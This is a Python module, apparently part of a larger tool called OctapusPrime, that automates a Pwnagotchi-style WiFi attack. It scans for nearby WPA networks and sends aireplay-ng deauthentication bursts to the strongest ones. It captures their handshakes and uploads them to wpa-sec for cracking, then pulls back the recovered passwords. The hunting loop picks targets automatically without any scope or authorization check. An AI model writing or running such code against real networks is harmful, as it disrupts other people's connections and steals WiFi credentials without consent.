#!/usr/bin/env python3
"""
OctapusPrime WiFi Pwnagotchi-like Module
Scans for WiFi networks, captures WPA handshakes via deauthentication,
and submits them to wpa-sec.stanev.org for cracking.
"""

import subprocess
import threading
import logging
import os
import re
import time
import json
import glob

import requests

from pathlib import Path
from queue import Queue

# Directories
BASE_DIR = Path(__file__).resolve().parent
HANDSHAKE_DIR = BASE_DIR / "handshakes"
HANDSHAKE_DIR.mkdir(parents=True, exist_ok=True)

# WPA-SEC API
WPA_SEC_URL = "https://wpa-sec.stanev.org"
WPA_SEC_UPLOAD = f"{WPA_SEC_URL}/?submit"
WPA_SEC_RESULTS = f"{WPA_SEC_URL}/?api&dl=1"

# Shared log queue (will be set from server.py)
log_queue: Queue = None


def set_log_queue(q: Queue):
    """Set the shared log queue for real-time UI updates."""
    global log_queue
    log_queue = q


def _emit(tool, message):
    """Log and enqueue a message for the web UI."""
    logging.info(f"[{tool}] {message}")
    if log_queue:
        try:
            log_queue.put_nowait({"tool": tool, "line": message})
        except Exception:
            pass


class WiFiPwnManager:
    """Manages WiFi scanning, deauth, handshake capture, and WPA-SEC submission."""

    def __init__(self):
        self.is_running = False
        self.monitor_iface = None
        self.original_iface = None
        self.networks = []
        self.captured_handshakes = []
        self.current_target = None
        self._stop_event = threading.Event()
        self._process = None
        self._scan_thread = None

    # ------------------------------------------------------------------
    # Interface management
    # ------------------------------------------------------------------
    def get_wireless_interfaces(self):
        """List wireless interfaces available on the system."""
        interfaces = []
        try:
            result = subprocess.run(
                ["iw", "dev"],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    interfaces.append(line.split()[1])
        except Exception as e:
            _emit("wifi", f"Failed to list wireless interfaces: {e}")
        return interfaces

    def enable_monitor_mode(self, interface):
        """Put *interface* into monitor mode, return the monitor interface name."""
        try:
            _emit("wifi", f"Enabling monitor mode on {interface}...")
            self.original_iface = interface

            # Kill interfering processes
            subprocess.run(
                ["airmon-ng", "check", "kill"],
                capture_output=True, text=True, timeout=15
            )

            result = subprocess.run(
                ["airmon-ng", "start", interface],
                capture_output=True, text=True, timeout=15
            )

            # Derive the monitor interface name
            mon_iface = f"{interface}mon"
            # Check if airmon-ng renamed it
            for line in result.stdout.splitlines():
                m = re.search(r"monitor mode.*enabled.*on\s+(\S+)", line, re.I)
                if m:
                    mon_iface = m.group(1)
                    break

            # Verify interface exists
            check = subprocess.run(
                ["iw", "dev"], capture_output=True, text=True, timeout=10
            )
            if mon_iface not in check.stdout:
                # Fallback: try the original name (some drivers)
                if interface in check.stdout:
                    mon_iface = interface

            self.monitor_iface = mon_iface
            _emit("wifi", f"Monitor mode enabled on {mon_iface}")
            return mon_iface

        except Exception as e:
            _emit("wifi", f"Failed to enable monitor mode: {e}")
            return None

    def disable_monitor_mode(self):
        """Restore the original managed-mode interface."""
        iface = self.monitor_iface or self.original_iface
        if not iface:
            return
        try:
            _emit("wifi", f"Disabling monitor mode on {iface}...")
            subprocess.run(
                ["airmon-ng", "stop", iface],
                capture_output=True, text=True, timeout=15
            )
            # Restart network manager
            subprocess.run(
                ["systemctl", "start", "NetworkManager"],
                capture_output=True, text=True, timeout=10
            )
            self.monitor_iface = None
            _emit("wifi", "Monitor mode disabled")
        except Exception as e:
            _emit("wifi", f"Failed to disable monitor mode: {e}")

    # ------------------------------------------------------------------
    # Scanning
    # ------------------------------------------------------------------
    def scan_networks(self, interface=None, duration=15):
        """
        Run airodump-ng for *duration* seconds and parse CSV output.
        Returns a list of network dicts.
        """
        iface = interface or self.monitor_iface
        if not iface:
            _emit("wifi", "No monitor interface available for scanning")
            return []

        csv_prefix = str(HANDSHAKE_DIR / "scan_result")
        # Remove old scan files
        for f in glob.glob(f"{csv_prefix}*"):
            os.remove(f)

        _emit("wifi", f"Scanning for networks on {iface} ({duration}s)...")

        try:
            proc = subprocess.Popen(
                [
                    "airodump-ng",
                    "--output-format", "csv",
                    "--write", csv_prefix,
                    iface,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(duration)
            proc.terminate()
            proc.wait(timeout=5)
        except Exception as e:
            _emit("wifi", f"Scan error: {e}")
            return []

        # Parse the CSV
        csv_file = f"{csv_prefix}-01.csv"
        networks = self._parse_airodump_csv(csv_file)
        self.networks = networks
        _emit("wifi", f"Found {len(networks)} networks")
        return networks

    def _parse_airodump_csv(self, csv_path):
        """Parse airodump-ng CSV output into a list of dicts."""
        networks = []
        if not os.path.exists(csv_path):
            return networks

        try:
            with open(csv_path, "r", errors="ignore") as f:
                content = f.read()

            # Split by the blank line separating APs from clients
            sections = content.split("\r\n\r\n")
            if not sections:
                return networks

            ap_section = sections[0]
            lines = ap_section.strip().splitlines()

            # Find header line
            header_idx = None
            for i, line in enumerate(lines):
                if "BSSID" in line and "ESSID" in line:
                    header_idx = i
                    break

            if header_idx is None:
                return networks

            for line in lines[header_idx + 1:]:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid = parts[0]
                if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                    continue

                channel_str = parts[3].strip()
                try:
                    channel = int(channel_str)
                except ValueError:
                    channel = 0

                power_str = parts[8].strip() if len(parts) > 8 else "-1"
                try:
                    power = int(power_str)
                except ValueError:
                    power = -1

                encryption = parts[5].strip() if len(parts) > 5 else ""
                essid = parts[13].strip() if len(parts) > 13 else ""

                networks.append({
                    "bssid": bssid,
                    "essid": essid,
                    "channel": channel,
                    "power": power,
                    "encryption": encryption,
                    "clients": 0,
                })

        except Exception as e:
            _emit("wifi", f"CSV parse error: {e}")

        return networks

    # ------------------------------------------------------------------
    # Deauthentication & handshake capture
    # ------------------------------------------------------------------
    def capture_handshake(self, bssid, channel, essid="", duration=30):
        """
        Target a specific AP: tune to its channel, start airodump-ng to
        capture the handshake, and send deauth packets.
        """
        iface = self.monitor_iface
        if not iface:
            _emit("wifi", "No monitor interface – enable monitor mode first")
            return None

        self.current_target = {"bssid": bssid, "essid": essid, "channel": channel}
        cap_prefix = str(HANDSHAKE_DIR / f"hs_{bssid.replace(':', '')}")

        # Remove old capture files for this BSSID
        for f in glob.glob(f"{cap_prefix}*"):
            os.remove(f)

        _emit("wifi", f"Targeting {essid or bssid} on channel {channel}...")

        # Set channel
        subprocess.run(
            ["iwconfig", iface, "channel", str(channel)],
            capture_output=True, text=True, timeout=5,
        )

        # Start airodump-ng capturing for this BSSID
        airodump = subprocess.Popen(
            [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "--output-format", "cap",
                "--write", cap_prefix,
                iface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Send deauth bursts
        _emit("wifi", f"Sending deauth to {essid or bssid}...")
        try:
            for _ in range(3):
                if self._stop_event.is_set():
                    break
                subprocess.run(
                    [
                        "aireplay-ng",
                        "--deauth", "10",
                        "-a", bssid,
                        iface,
                    ],
                    capture_output=True, text=True, timeout=15,
                )
                time.sleep(5)
        except Exception as e:
            _emit("wifi", f"Deauth error: {e}")

        # Wait for remaining capture time
        remaining = max(0, duration - 20)
        if remaining > 0 and not self._stop_event.is_set():
            _emit("wifi", f"Listening for handshake ({remaining}s)...")
            time.sleep(remaining)

        airodump.terminate()
        try:
            airodump.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump.kill()

        # Check for captured handshake
        cap_file = f"{cap_prefix}-01.cap"
        if os.path.exists(cap_file):
            has_hs = self._verify_handshake(cap_file, bssid)
            if has_hs:
                hs_record = {
                    "bssid": bssid,
                    "essid": essid,
                    "file": cap_file,
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "submitted": False,
                    "cracked": False,
                    "password": None,
                }
                self.captured_handshakes.append(hs_record)
                _emit("wifi", f"Handshake captured for {essid or bssid}!")
                return hs_record

        _emit("wifi", f"No handshake captured for {essid or bssid}")
        self.current_target = None
        return None

    def _verify_handshake(self, cap_file, bssid):
        """Use aircrack-ng to verify a captured handshake."""
        try:
            result = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True, timeout=15,
            )
            output = result.stdout + result.stderr
            if "1 handshake" in output.lower() or "wpa (" in output.lower():
                return True
        except Exception:
            pass
        return False

    # ------------------------------------------------------------------
    # WPA-SEC integration
    # ------------------------------------------------------------------
    def submit_to_wpasec(self, cap_file, api_key):
        """Upload a .cap file to wpa-sec.stanev.org."""
        if not api_key:
            _emit("wifi", "WPA-SEC API key not configured")
            return {"success": False, "message": "API key not configured"}

        if not os.path.exists(cap_file):
            _emit("wifi", f"Capture file not found: {cap_file}")
            return {"success": False, "message": "File not found"}

        _emit("wifi", f"Submitting {os.path.basename(cap_file)} to WPA-SEC...")

        try:
            with open(cap_file, "rb") as f:
                resp = requests.post(
                    WPA_SEC_UPLOAD,
                    files={"file": (os.path.basename(cap_file), f, "application/octet-stream")},
                    cookies={"key": api_key},
                    timeout=60,
                )

            if resp.status_code == 200:
                body = resp.text.strip()
                _emit("wifi", f"WPA-SEC response: {body}")
                return {"success": True, "message": body}
            else:
                msg = f"WPA-SEC upload failed (HTTP {resp.status_code})"
                _emit("wifi", msg)
                return {"success": False, "message": msg}

        except Exception as e:
            msg = f"WPA-SEC upload error: {e}"
            _emit("wifi", msg)
            return {"success": False, "message": msg}

    def check_wpasec_results(self, api_key):
        """Download cracked results from WPA-SEC."""
        if not api_key:
            return {"success": False, "message": "API key not configured"}

        try:
            resp = requests.get(
                WPA_SEC_RESULTS,
                cookies={"key": api_key},
                timeout=30,
            )
            if resp.status_code == 200:
                results = []
                for line in resp.text.strip().splitlines():
                    parts = line.split(":")
                    if len(parts) >= 3:
                        results.append({
                            "bssid": parts[0],
                            "essid": parts[1],
                            "password": ":".join(parts[2:]),
                        })
                        # Update local records
                        for hs in self.captured_handshakes:
                            if hs["bssid"].lower() == parts[0].lower():
                                hs["cracked"] = True
                                hs["password"] = ":".join(parts[2:])

                _emit("wifi", f"WPA-SEC: {len(results)} cracked networks found")
                return {"success": True, "results": results}
            else:
                return {"success": False, "message": f"HTTP {resp.status_code}"}

        except Exception as e:
            return {"success": False, "message": str(e)}

    # ------------------------------------------------------------------
    # Automated hunt (Pwnagotchi-style loop)
    # ------------------------------------------------------------------
    def start_auto_hunt(self, interface, api_key, scan_duration=15, capture_duration=30):
        """
        Automated loop: scan → pick best target → deauth → capture → submit.
        Runs in a background thread.
        """
        if self.is_running:
            return {"success": False, "message": "Hunt already running"}

        self._stop_event.clear()
        self.is_running = True

        def _hunt():
            try:
                mon = self.enable_monitor_mode(interface)
                if not mon:
                    self.is_running = False
                    return

                while not self._stop_event.is_set():
                    networks = self.scan_networks(duration=scan_duration)

                    # Filter to WPA/WPA2 only and sort by signal strength
                    wpa_nets = [
                        n for n in networks
                        if "WPA" in n.get("encryption", "").upper()
                        and n.get("essid")
                    ]
                    wpa_nets.sort(key=lambda n: n["power"], reverse=True)

                    if not wpa_nets:
                        _emit("wifi", "No WPA networks found, rescanning...")
                        continue

                    for net in wpa_nets[:3]:  # Top 3 strongest
                        if self._stop_event.is_set():
                            break

                        # Skip already captured
                        already = any(
                            h["bssid"].lower() == net["bssid"].lower()
                            for h in self.captured_handshakes
                        )
                        if already:
                            continue

                        hs = self.capture_handshake(
                            net["bssid"], net["channel"],
                            net["essid"], capture_duration
                        )
                        if hs and api_key:
                            self.submit_to_wpasec(hs["file"], api_key)
                            hs["submitted"] = True

                    # Brief pause between rounds
                    for _ in range(10):
                        if self._stop_event.is_set():
                            break
                        time.sleep(1)

            except Exception as e:
                _emit("wifi", f"Auto-hunt error: {e}")
            finally:
                self.disable_monitor_mode()
                self.is_running = False
                _emit("wifi", "Auto-hunt stopped")

        self._scan_thread = threading.Thread(target=_hunt, daemon=True)
        self._scan_thread.start()
        return {"success": True, "message": "Auto-hunt started"}

    def stop(self):
        """Stop any running WiFi operation."""
        self._stop_event.set()
        self.is_running = False
        _emit("wifi", "Stop signal sent")
        return {"success": True, "message": "Stop signal sent"}

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------
    def get_status(self):
        """Return current state for the frontend."""
        return {
            "is_running": self.is_running,
            "monitor_iface": self.monitor_iface,
            "original_iface": self.original_iface,
            "current_target": self.current_target,
            "networks_found": len(self.networks),
            "networks": self.networks[:50],
            "handshakes": [
                {
                    "bssid": h["bssid"],
                    "essid": h["essid"],
                    "timestamp": h["timestamp"],
                    "submitted": h["submitted"],
                    "cracked": h["cracked"],
                    "password": h["password"],
                }
                for h in self.captured_handshakes
            ],
        }


# Singleton instance
wifi_manager = WiFiPwnManager()
